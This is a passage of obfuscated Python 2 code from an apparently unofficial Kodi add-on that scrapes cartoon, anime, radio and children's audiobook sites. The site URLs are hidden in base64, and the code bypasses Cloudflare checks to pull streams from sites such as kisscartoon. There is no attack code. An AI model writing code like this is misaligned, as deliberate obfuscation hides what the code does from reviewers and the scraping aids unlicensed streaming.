    oOoooooOoO = open ( ( os . path . join ( OOOOO , file ) ) ) . read ( )
    OOoOOo0O00O = oOoooooOoO . replace ( oooOOOOO , 'special://home/' )
    Ii1II1I11i1 = open ( ( os . path . join ( OOOOO , file ) ) , mode = 'w' )
    Ii1II1I11i1 . write ( str ( OOoOOo0O00O ) )
    Ii1II1I11i1 . close ( )
 OOo00O ( )
 if 36 - 36: O0 + Oo
def iIIIi1i1I11i ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL3d3dy5saXN0ZW5saXZlLmV1L3VrLmh0bWw=' ) )
 o0o = re . compile ( '<tr>.+?<td><a href=".+?"><b>(.+?)</b>.+?<td><a href="(.+?)">' , re . DOTALL ) . findall ( iIIiiI1II1i11 )
 for OO , iI1i11 in o0o :
  oOO0OO0OO ( OO , iI1i11 , 222 , ii11iIi1I + 'radio.png' )
  if 87 - 87: OoIii111II + iIii1I11I1II1 - OoooooooOO
def IiI1 ( ) :
 iIIiiI1II1i11 = o0o0 ( i1111 ( 'aHR0cDovL3d3dy50b29uamV0LmNvbS8=' ) )
 o0o = re . compile ( '<a href="(.+?)" style="font-size:.8em;">(.+?)</a>' ) . findall ( iIIiiI1II1i11 )
 for iI1i11 , OO in o0o :
  ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://www.toonjet.com/' + iI1i11 , 8051 , ii11iIi1I + 'classictoons.png' )
def i1IIii1iiIi ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<a href="(.+?)"><img src="(.+?)"' ) . findall ( iIIiiI1II1i11 )
 oo000 = re . compile ( '<a href="(.+?)">.+?</a></td></tr></table>' ) . findall ( iIIiiI1II1i11 )
 for url , o0O0o0 in o0o :
  if 'ol.gif' in o0O0o0 :
   pass
  elif 'link_block_' in o0O0o0 :
   pass
  elif '.png' in o0O0o0 :
   pass
  else :
   ooOO00oOOo000 ( ( o0O0o0 ) . replace ( 'http://www.toonjet.com/images/icons/' , '' ) . replace ( 'images/icons/' , '' ) . replace ( '.jpg' , '' ) . replace ( '_icon' , '' ) . replace ( '_' , ' ' ) , 'http://www.toonjet.com/' + url , 8052 , ii11iIi1I + 'vod.png' )
 for url in oo000 :
  ooOO00oOOo000 ( 'NEXT PAGE' , 'http://www.toonjet.com/' + url , 8051 , ii11iIi1I + 'Next.png' )
def oooo0OOo ( url ) :
 iIIiiI1II1i11 = o0o0 ( url )
 o0o = re . compile ( '<iframe width="640" height="480" src="(.+?)" frameborder="0" allowfullscreen></iframe>' ) . findall ( iIIiiI1II1i11 )
 for url in o0o :
  oOO0OO0OO ( '[COLORgreen]PLAY[/COLOR]' , ( url ) . replace ( 'http://www.youtube.com/embed/' , '' ) . replace ( '?autoplay=0' , '' ) , 8043 , ii11iIi1I + 'classictoons.png' )
  if 72 - 72: O0 / o0Oo0O0Oo00oO + OoooooooOO * oo0OO
  if 61 - 61: OoooooooOO % OoOoOO00 - OOOo0 % ii11ii1ii + i1IIi
def i1II ( ) :
 iIi1IiI ( 'Audio Books' , '' , 30011 , ii11iIi1I + 'audiobooks.png' , ii11iIi1I + 'audiobooks.png' , '' )
 iIi1IiI ( 'Kids Audio Books' , '' , 30006 , ii11iIi1I + 'kidsaudiobooks.png' , ii11iIi1I + 'kidsaudiobooks.png' , '' )
 if 14 - 14: OoO0O0 % OoIii111II % Oo - i11iIiiIii
def o0OO000ooOo ( ) :
 iIi1IiI ( 'All' , '' , 30001 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 iIi1IiI ( 'Popular' , '' , 30012 , ii11iIi1I + 'POPULARv.png' , ii11iIi1I + 'POPULARv.png' , '' )
 iIi1IiI ( 'Search' , '' , 30013 , ii11iIi1I + 'search.png' , ii11iIi1I + 'search.png' , '' )
 if 86 - 86: Ooo00oOo00o * OoooooooOO
def OooO0oOo ( ) :
 OoOO = ooOOO0 ( OO0o + 'books' + II11iiii1Ii )
 o0o = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( OoOO )
 for OO , iI1i11 , oOOo00O0OOOo in o0o :
  if 'Parent' in OO :
   pass
  elif '2' in oOOo00O0OOOo :
   iIi1IiI ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 31 - 31: Ooo0OO0oOO % iii11 * Ooo0OO0oOO
def IiI ( ) :
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 OoOO = ooOOO0 ( OO0o + 'books' + II11iiii1Ii )
 o0o = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( OoOO )
 for OO , iI1i11 , oOOo00O0OOOo in o0o :
  if IIi1I1iiiii in OO . lower ( ) :
   if '1' in oOOo00O0OOOo :
    iIi1IiI ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   elif '2' in oOOo00O0OOOo :
    iIi1IiI ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   elif '3' in oOOo00O0OOOo :
    iIi1IiI ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
    if 34 - 34: Ooo0OO0oOO % o0Oo0O0Oo00oO . O0 . iIii1I11I1II1
    if 93 - 93: i1IIi . i11iIiiIii . Oo
def O0O00OOo ( ) :
 OoOO = ooOOO0 ( OO0o + 'books' + II11iiii1Ii )
 o0o = re . compile ( '<NAME=>(.*?)</NAME><URL=>(.*?)</URL><CAT=>(.*?)</CAT>' ) . findall ( OoOO )
 for OO , iI1i11 , oOOo00O0OOOo in o0o :
  if '1' in oOOo00O0OOOo :
   iIi1IiI ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 3010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '2' in oOOo00O0OOOo :
   iIi1IiI ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '3' in oOOo00O0OOOo :
   iIi1IiI ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '.mp3' , '' ) , iI1i11 , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 66 - 66: i11iIiiIii / OOooOOo - OoooooooOO / i1IIi . i11iIiiIii
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 16 - 16: Oo % ii11ii1ii + Ooo0OO0oOO - O0 . oo0OO / O0o0Ooo
def IIi1I ( url ) :
 Ooo0OOoOoO0 = url
 OoOO = ooOOO0 ( url )
 oo000 = re . compile ( '<a href="(.+?)">(.+?)</a>' ) . findall ( OoOO )
 for url , OO in oo000 :
  if 'mp3' in OO :
   ooOooo000oOO ( ( OO ) . replace ( '%20' , ' ' ) , Ooo0OOoOoO0 + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  if 'wma' in OO :
   ooOooo000oOO ( ( OO ) . replace ( '%20' , ' ' ) , Ooo0OOoOoO0 + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  if 'm4b' in OO :
   ooOooo000oOO ( ( OO ) . replace ( '%20' , ' ' ) , Ooo0OOoOoO0 + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif '/' in OO :
   iIi1IiI ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , Ooo0OOoOoO0 + url , 30009 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 27 - 27: O0 . O0o0Ooo / oo0OO
   if 96 - 96: ii11ii1ii % o0Oo0O0Oo00oO % ii11i1 - o0Oo0O0Oo00oO % I1IiI + ii11ii1ii
   if 3 - 3: O0
def Ooo0Oo0oo0 ( url ) :
 OoOO = ooOOO0 ( url )
 Ooo0OOoOoO0 = url
 o0o = re . compile ( '<li><a href="(.+?)">(.+?)</a></li>' ) . findall ( OoOO )
 for url , OO in o0o :
  if 'Parent' in OO :
   pass
  elif '.db' in OO :
   pass
  elif '.jpg' in OO :
   pass
  elif '.html' in OO :
   pass
  elif '.doc' in OO :
   pass
  elif 'mp3' in OO :
   ooOooo000oOO ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , Ooo0OOoOoO0 + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  elif 'm4a' in OO :
   ooOooo000oOO ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , Ooo0OOoOoO0 + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   iIi1IiI ( ( OO ) . replace ( '%20' , ' ' ) . replace ( '/' , '' ) . replace ( '.mp3' , '' ) , Ooo0OOoOoO0 + url , 30010 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 83 - 83: O0o0Ooo
   if 48 - 48: OoOoOO00 * iii11 * O0o0Ooo
def i1iiiIii11 ( ) :
 iIi1IiI ( 'A-Z' , '' , 7 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 iIi1IiI ( 'All' , '' , 3 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 iIi1IiI ( 'Search' , '' , 14 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
 if 67 - 67: OOooOOo % I1IiI . I1IiI - o0Oo0O0Oo00oO
def O00ooOo ( ) :
 OoOO = ooOOO0 ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9tcDNfZG93bmxvYWRzLmh0bQ==' ) )
 o0o = re . compile ( '<td width=".+?" align="center">.+?<a href="(.*?)">.+?<img border="0" src="images/Squeeze%20(.*?).gif" width="74" height=".*?"></a></td>' , re . DOTALL ) . findall ( OoOO )
 for iI1i11 , o0O0o0 in o0o :
  print '<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<' + iI1i11 + '>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>'
  if '-x' in o0O0o0 :
   pass
  else :
   iIi1IiI ( o0O0o0 , ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) ) + ( iI1i11 ) . replace ( 'colour_it' , 'books_audio/audio_books_a' ) , 30008 , ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9pbWFnZXMvU3F1ZWV6ZSUyMA==' ) ) + o0O0o0 + '.gif' , ii11iIi1I + 'kodible.png' , '' )
   if 80 - 80: OOooOOo - iii11 + OoooooooOO
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 98 - 98: iii11 + i1IIi . OOOo0 - OoOoOO00 - OOooOOo
 if 24 - 24: Oo - i1IIi + Ooo0OO0oOO
def IiiIi ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<td width=".*?" height=".*?"><b>.*?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( OoOO )
 for url , OO in o0o :
  if '</a>' in OO :
   pass
  elif '(' in OO :
   iIi1IiI ( ( OO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   ooOooo000oOO ( ( OO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 10 - 10: Ooo00oOo00o / Oo
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 15 - 15: oo0OO . I1IiI / oo0OO * Ooo0OO0oOO - OOOo0 % ii11ii1ii
def oo0OOOOOO0 ( ) :
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 OoOO = ooOOO0 ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9jb21wbGV0ZV9saXN0Lmh0bQ==' ) )
 o0o = re . compile ( '<td width=".+?">.*?<b>.+?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  if IIi1I1iiiii in OO . lower ( ) :
   if '</a>' in OO :
    pass
   elif '(' in OO :
    iIi1IiI ( ( OO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + iI1i11 , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   else :
    ooOooo000oOO ( ( OO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + iI1i11 , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
    if 26 - 26: iIii1I11I1II1
    if 87 - 87: ii11ii1ii / OoooooooOO - Oo % I1IiI % OoO0O0 % Oo
def Ii1 ( ) :
 OoOO = ooOOO0 ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9jb21wbGV0ZV9saXN0Lmh0bQ==' ) )
 o0o = re . compile ( '<td width=".+?">.*?<b>.+?<a href="(.*?)">(.*?)</a></b></td>' , re . DOTALL ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  if '</a>' in OO :
   pass
  elif '(' in OO :
   iIi1IiI ( ( OO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + iI1i11 , 30005 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
  else :
   ooOooo000oOO ( ( OO ) . replace ( '&nbsp;' , '' ) . replace ( '  ' , '' ) . replace ( '+' , '' ) . replace ( '.mp3' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay8=' ) + iI1i11 , 30004 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 34 - 34: oo0OO - OoooooooOO . OOOo0 / OoOoOO00
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 27 - 27: Ooo00oOo00o / Oo * o0Oo0O0Oo00oO - Ooo00oOo00o
 if 19 - 19: Ooo0OO0oOO
def Ooooo0OoO0 ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<a href="(.+?)">Download</a></b></td>' ) . findall ( OoOO )
 for url in o0o :
  Ooo0OOoOoO0 = ( i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) ) + url
  Resolve ( Ooo0OOoOoO0 )
  if 9 - 9: iii11 . OoO0O0
def iIi1i ( url ) :
 OoOO = ooOOO0 ( url )
 o0o = re . compile ( '<td width="247">(.*?)</td>.*?<a href="(.+?)">' , re . DOTALL ) . findall ( OoOO )
 for OO , url in o0o :
  if '<p align' in OO :
   pass
  elif '&nbsp;' in OO :
   pass
  else :
   ooOooo000oOO ( ( OO ) . replace ( '&nbsp;' , '' ) , i1111 ( 'aHR0cDovL3d3dy5raWRzYXVkaW9ib29rcy5jby51ay9ib29rc19hdWRpby8=' ) + url , 10012 , ii11iIi1I + 'kodible.png' , ii11iIi1I + 'kodible.png' , '' )
   if 67 - 67: I1IiI / OOooOOo * Ooo00oOo00o / iii11 * ii11ii1ii / OoIii111II
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 64 - 64: OoIii111II - OOOo0 / oo0OO - Ooo00oOo00o
 if 37 - 37: i11iIiiIii / oo0OO
def oo00OoO ( ) :
 OoOO = cloudflare . source ( i1111 ( 'aHR0cDovL3dhdGNoY2FydG9vbnNvbmxpbmUuZXUv' ) )
 o0o = re . compile ( 'class="menu-item menu-item-type-.+?><a href="([^"]*)">(.+?)</a></li>' , re . DOTALL ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  if 'ongoing' in iI1i11 :
   ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , iI1i11 , 21005 , ii11iIi1I + 'on-going.png' , '' , '' )
  if 'cartoon-series' in iI1i11 :
   ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , iI1i11 , 21005 , ii11iIi1I + 'cartoonseries.png' , '' , '' )
  if 'disney' in iI1i11 :
   ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , iI1i11 , 21005 , ii11iIi1I + 'disneytoons.png' , '' , '' )
  if 'genre' in iI1i11 :
   ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , iI1i11 , 21005 , ii11iIi1I + 'cartoongenre.png' , '' , '' )
  if 'years' in iI1i11 :
   ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , iI1i11 , 21005 , ii11iIi1I + 'years.png' , '' , '' )
def iIIi1IIi ( url ) :
 OoOO = cloudflare . source ( url )
 o0o = re . compile ( '<a href="([^"]*)" title="([^"]*)" rel="nofollow" id="featured-thumbnail">.+?<div class="featured-thumbnail"><img width="140" height="200" src="([^"]*)"' , re . DOTALL ) . findall ( OoOO )
 i111i11I1ii = re . compile ( '<button type="button"><a href="([^"]*)" target="_blank">(.+?)</a>' ) . findall ( OoOO )
 next = re . compile ( '<link rel="next" href="([^"]*)" />' ) . findall ( OoOO )
 for url , OO , o0O0o0 in o0o :
  ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , url , 21006 , o0O0o0 , o0O0o0 , OO )
 for url , OO in i111i11I1ii :
  ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , url , 21005 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url in next :
  ooOooo000oOO ( '[COLORgreen]NEXT[/COLOR]' , url , 21005 , ii11iIi1I + 'Next.png' , '' , '' )
def OOooo ( url ) :
 OoOO = cloudflare . source ( url )
 o0o = re . compile ( '<li><a href="([^"]*)" >(.+?)</a></li>' , re . DOTALL ) . findall ( OoOO )
 oo0 = re . compile ( 'file:"([^"]*)",type:"mp4",label:"([^"]*)"' , re . DOTALL ) . findall ( OoOO )
 oOOII1i11i1iIi11 = re . compile ( 'src="([^"]*)" frameborder=' ) . findall ( OoOO )
 oo0O0oO0O0O = re . compile ( '<iframe src="([^"]*)"' ) . findall ( OoOO )
 for url , OO in o0o :
  ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , url , 21007 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url in oOOII1i11i1iIi11 :
  ooOooo000oOO ( '[COLORgreen]PLAY[/COLOR]' , 'http:' + url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 for url , OO in oo0 :
  Ii1iIiII1ii1 ( '[COLORgreen]' + OO + '[/COLOR]' , url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
 else :
  ooOooo000oOO ( '[COLORgreen]NO STREAMS AVAILABLE[/COLOR]' , url , 21005 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
def oOo0O ( url ) :
 OoOO = cloudflare . source ( url )
 o0o = re . compile ( 'file:"([^"]*)",type:"mp4",label:"([^"]*)"' , re . DOTALL ) . findall ( OoOO )
 for url , OO in o0o :
  Ii1iIiII1ii1 ( '[COLORgreen]' + OO + '[/COLOR]' , url , 222 , ii11iIi1I + 'watchcartoons.png' , '' , '' )
  if 26 - 26: OoO0O0 / i1IIi * OoIii111II . OOOo0
def i1iIIIiiiI ( ) :
 ooOO00oOOo000 ( '[COLORgreen]CARTOONS[/COLOR]' , '' , 20001 , ii11iIi1I + 'ORIGINCARTOON.png' )
 ooOO00oOOo000 ( '[COLORgreen]ANIME[/COLOR]' , 'https://kissanime.to/AnimeList' , 20001 , ii11iIi1I + 'ORIGINCARTOON.png' )
 if 94 - 94: O0 - Ooo0OO0oOO - iIii1I11I1II1 % o0Oo0O0Oo00oO / ii11i1 % oo0OO
def iIi1IIi1ii ( ) :
 ooOO00oOOo000 ( '[COLORgreen]BY NAME[/COLOR]' , 'http://kisscartoon.me/CartoonList' , 20002 , ii11iIi1I + 'ORIGINCARTOON.png' )
 ooOO00oOOo000 ( '[COLORgreen]BY GENRE[/COLOR]' , 'http://kisscartoon.me/CartoonList' , 20003 , ii11iIi1I + 'ORIGINCARTOON.png' )
 if 35 - 35: oo0OO / ii11ii1ii * OoooooooOO . OoOoOO00 / Oo
def Iii11i ( url ) :
 OoOO = cloudflare . source ( url )
 o0o = re . compile ( 'href="(.+?)">(.+?)</a>' , re . DOTALL ) . findall ( OoOO )
 for url , OO in o0o :
  if '?c=' in url :
   ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://kisscartoon.me' + url , 20004 , ii11iIi1I + 'ORIGINCARTOON.png' )
   if 73 - 73: Oo - I1IiI - OoIii111II - OOOo0
def oo0o0oOo ( url ) :
 OoOO = cloudflare . source ( url )
 o0o = re . compile ( 'href="(.+?)" title="(.+?)">/n(.+?)</a><br/>' , re . DOTALL ) . findall ( OoOO )
 for url , OO0oOOo0o , OO in o0o :
  if 'Genre' in url :
   ooOO00oOOo000 ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://kisscartoon.me' + url , 20004 , ii11iIi1I + 'ORIGINCARTOON.png' )
   if 50 - 50: oo0OO . ii11ii1ii . Ooo00oOo00o * Ooo0OO0oOO + OoOoOO00 % i11iIiiIii
def i1i1IiIiIi1Ii ( url ) :
 OoOO = cloudflare . source ( url )
 o0o = re . compile ( 'src="(.+?)" style=.+?<a class="bigChar" href="(.+?)">(.+?)</a>.+?<p>(.+?)</p>' , re . DOTALL ) . findall ( OoOO )
 for url , OO0oOOo0o , OO in o0o :
  ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://kisscartoon.me' + url , 20005 , img , '' , OO0oOOo0o )
  if 64 - 64: iii11 + OoooooooOO * OoooooooOO
def i1I ( url ) :
 OoOO = cloudflare . source ( url )
 o0o = re . compile ( '<img width="120" height="165" src="(.+?)" style=.+?<a class="bigChar" href="(.+?)">(.+?)</a>.+?<p>(.+?)</p>' , re . DOTALL ) . findall ( OoOO )
 for url , OO0oOOo0o , OO in o0o :
  ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , 'http://kisscartoon.me' + url , 20005 , img , '' , OO0oOOo0o )
  if 36 - 36: OOOo0 * Oo
  if 77 - 77: OoIii111II % i1IIi - ii11i1
  if 93 - 93: Ooo00oOo00o * Oo
  if 73 - 73: OOooOOo - OOOo0 * i1IIi / i11iIiiIii * iii11 % OoOoOO00
  if 56 - 56: OoooooooOO * Oo . Oo . ii11ii1ii
def II1 ( ) :
 if 74 - 74: OoooooooOO % iii11 % O0o0Ooo - OOOo0 - Ooo0OO0oOO
 ooOooo000oOO ( '[COLORgreen]Cartoons[/COLOR]' , i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2NhcnRvb24=' ) , 10004 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 ooOooo000oOO ( '[COLORgreen]Search Cartoons[/COLOR]' , '' , 10005 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 if 58 - 58: O0
def oO00oOOo0Oo ( ) :
 IIi1I1iiiii = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 O0O0ooOOO = IIi1I1iiiii . lower ( )
 OoOO = ooOOO0 ( i1111 ( 'aHR0cDovL3d3dy5hbmltZXRvb24ub3JnL2NhcnRvb24=' ) )
 o0o = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( OoOO )
 for iI1i11 , OO in o0o :
  if IIi1I1iiiii in OO . lower ( ) :
   if 'Dad!' in OO :
    pass
   elif 'Family Guy' in OO :
    pass
   elif '2 Stupid' in OO :
    pass
   elif 'The Zelfs' in OO :
    pass
   elif 'A Clone' in OO :
    pass
   elif 'A.T.O.M' in OO :
    pass
   elif 'Almost Naked' in OO :
    pass
   elif 'Angry Kid' in OO :
    pass
   elif 'Annoying Orange' in OO :
    pass
   elif 'Aqua Teen' in OO :
    pass
   elif 'Assy Mcgee' in OO :
    pass
   elif 'Astroblast' in OO :
    pass
   elif 'Atomic Betty' in OO :
    pass
   elif 'Axe Cop' in OO :
    pass
   elif 'Baby Playpen' in OO :
    pass
   elif 'Beavis and Butt' in OO :
    pass
   elif 'Celebrity Deathmatch' in OO :
    pass
   elif 'Clerks The' in OO :
    pass
   elif 'Crapston Villas' in OO :
    pass
   elif 'Duckman:' in OO :
    pass
   elif 'Stripperella' in OO :
    pass
   elif 'Vixen' in OO :
    pass
   else :
    ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , iI1i11 , 10006 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
  xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 5 - 5: OOooOOo . O0 / Oo % Ooo00oOo00o
def OoOo ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '<td><a href="(.+?)">(.+)</a></td>' ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  if 'Dad!' in OO :
   pass
  elif 'Family Guy' in OO :
   pass
  elif '2 Stupid' in OO :
   pass
  elif 'The Zelfs' in OO :
   pass
  elif 'A Clone' in OO :
   pass
  elif 'A.T.O.M' in OO :
   pass
  elif 'Almost Naked' in OO :
   pass
  elif 'Angry Kid' in OO :
   pass
  elif 'Annoying Orange' in OO :
   pass
  elif 'Aqua Teen' in OO :
   pass
  elif 'Assy Mcgee' in OO :
   pass
  elif 'Astroblast' in OO :
   pass
  elif 'Atomic Betty' in OO :
   pass
  elif 'Axe Cop' in OO :
   pass
  elif 'Baby Playpen' in OO :
   pass
  elif 'Beavis and Butt' in OO :
   pass
  elif 'Celebrity Deathmatch' in OO :
   pass
  elif 'Clerks The' in OO :
   pass
  elif 'Crapston Villas' in OO :
   pass
  elif 'Duckman:' in OO :
   pass
  elif 'Stripperella' in OO :
   pass
  elif 'Vixen' in OO :
   pass
  else :
   ooOooo000oOO ( '[COLORgreen]' + OO + '[/COLOR]' , url , 10006 , ii11iIi1I + 'ORIGINCARTOON.png' , i1iiIII111ii , '' )
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 9 - 9: Oo . OOooOOo . iIii1I11I1II1 % iIii1I11I1II1
def ooO0oo0o0 ( url ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 oo000 = re . compile ( '<img src="(.+?)" id="series_image" width="250" height="370" alt=".+?" />' ) . findall ( iIIiiI1II1i11 )
 for o0O0o0 in oo000 :
  IIiIii1 = o0O0o0
 Ooo0oO0 = re . compile ( '<li><a href="(.+?)">Next</a></li>' ) . findall ( iIIiiI1II1i11 )
 for url in Ooo0oO0 :
  ooOooo000oOO ( '[COLORgreen]NEXT PAGE[/COLOR]' , url , 10006 , ii11iIi1I + 'Next.png' , i1iiIII111ii , '' )
 o0o = re . compile ( '&nbsp;<a href="(.+?)">(.+?)</a>' ) . findall ( iIIiiI1II1i11 )
 for url , OO in o0o :
  oOO0OO0OO ( '[COLORgreen]' + OO + '[/COLOR]' , url , 10007 , IIiIii1 )
  if 86 - 86: O0
  if 95 - 95: oo0OO * iii11 . I1IiI . i1IIi . i1IIi - OOooOOo
 xbmcplugin . addSortMethod ( I11i1 , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 26 - 26: iIii1I11I1II1 % i11iIiiIii % ii11ii1ii
def oo0O ( url , IMAGE ) :
 iIIiiI1II1i11 = ooOOO0 ( url )
 o0o = re . compile ( '"playlist">(.+?)</span></div><div><iframe src="(.+?)"' ) . findall ( iIIiiI1II1i11 )
 for OO , url in o0o :
  print OO + '     ' + url
  if 'easy' in url :
   III1i1IiI1i ( url )
   if 32 - 32: OoooooooOO - I1IiI - i11iIiiIii * OOooOOo / Oo + OoooooooOO
